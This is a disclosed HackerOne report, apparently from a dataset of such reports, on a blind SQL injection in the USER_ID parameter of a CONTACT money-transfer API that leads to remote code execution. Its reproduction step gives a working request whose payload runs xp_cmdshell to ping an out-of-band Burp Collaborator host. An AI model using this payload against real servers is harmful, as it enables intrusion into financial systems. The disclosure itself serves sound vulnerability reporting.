---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '816560'
original_report_id: '816560'
title: SQL injection on contactws.contact-sys.com in TRateObject.AddForOffice in USER_ID
  parameter leads to remote code execution
weakness: Code Injection
team_handle: qiwi
created_at: '2020-03-11T07:13:04.824Z'
disclosed_at: '2020-06-19T06:03:15.574Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 118
asset_identifier: '*.contact-sys.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- code-injection
---

# SQL injection on contactws.contact-sys.com in TRateObject.AddForOffice in USER_ID parameter leads to remote code execution

## Metadata

- HackerOne Report ID: 816560
- Weakness: Code Injection
- Program: qiwi
- Disclosed At: 2020-06-19T06:03:15.574Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary

The API interface on https://contactws.contact-sys.com:3456/ accepts a `<REQUEST/>` body to interact with the server's AppServ object. Because of insufficient input validation, an attacker can abuse the `USER_ID` parameter of the `TRateObject.AddForOffice` method to inject arbitrary SQL statements. This leads to a blind SQL injection vulnerability, which in turn leads to Remote Code Execution on the server.

## Technical details

This vulnerability is similar to my earlier reports #816254 and #816086, but targets a vulnerability in a different object class and action, i.e. `OBJECT_CLASS="TRateObject"` and `ACTION="AddForOffice"` to achieve remote code execution.

I want to make clear that this vulnerability exists independently of the fact that I can access methods on this test (?) server, since all integrators with valid credentials/certificates would be able to similarly target the production version of this object class action via the SOAP interface on https://enter.contact-sys.com:2221/wstrans/wsTrans.exe/soap/ITransmitter

## Steps to reproduce

1. Execute the following request (change the burp collaborator URL to your own);

     ```http
POST / HTTP/1.1
Host: contactws.contact-sys.com:3456
Content-Type: application/xml;charset=utf8
Content-Length: 326

    <REQUEST OBJECT_CLASS="TRateObject" ACTION="AddForOffice" POINT_CODE="TZAA" USER_ID="1; DECLARE @command varchar(255); SELECT @command='ping yeg0f86wcvq6k9n1k4s1aiel9cf23r.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command;"
INT_SOFT_ID="DA61D1CE-757F-44C3-B3F7-11A026C37CD4" ExpectSigned="No" LANG="EN">
</REQUEST>
```

2. Watch your DNS logs as the DNS resolution of the ping request comes in.

## Impact

By executing arbitrary commands on the server, an attacker could compromise the integrity, availability and confidentiality of customer's financially sensitive data on the CONTACT server and database, and pivot onto other servers on the internal network.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
